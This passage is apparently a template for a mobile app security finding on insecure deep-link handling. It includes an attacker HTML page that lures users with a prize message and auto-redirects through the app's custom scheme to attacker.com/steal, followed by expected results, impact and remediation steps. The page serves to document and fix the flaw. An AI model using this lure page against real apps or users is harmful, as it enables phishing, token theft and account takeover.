### 4. Create Attacker HTML Page
```html
<!-- Save as exploit.html, host on a web server or local HTTP server -->
<!DOCTYPE html>
<html>
<body>
  <h1>Click to claim your prize!</h1>
  <a href="{{ package_name }}://callback?redirect=https://attacker.com/steal">
    Claim Now
  </a>
  <script>
    // Auto-redirect after 1 second
    setTimeout(function() {
      window.location = "{{ package_name }}://callback?redirect=https://attacker.com/steal";
    }, 1000);
  </script>
</body>
</html>
```

## Expected Result
- The app processes the deep link without validating the origin or destination
- Tokens, session data, or auth codes are leaked to the attacker-controlled URL
- The user is redirected to a phishing page

## Impact
An attacker can craft a malicious link that, when opened by the victim, steals authentication tokens, session cookies, or redirects the user to a phishing page. This can lead to full account takeover.

## Remediation
{{ remediation or "1. Validate all deep link parameters against an allowlist of trusted domains\n2. Never pass authentication tokens via URL parameters in deep links\n3. Implement origin verification for OAuth callbacks\n4. Use App Links (HTTPS) instead of custom schemes for sensitive flows\n5. Add `android:autoVerify=\"true\"` to intent filters" }}
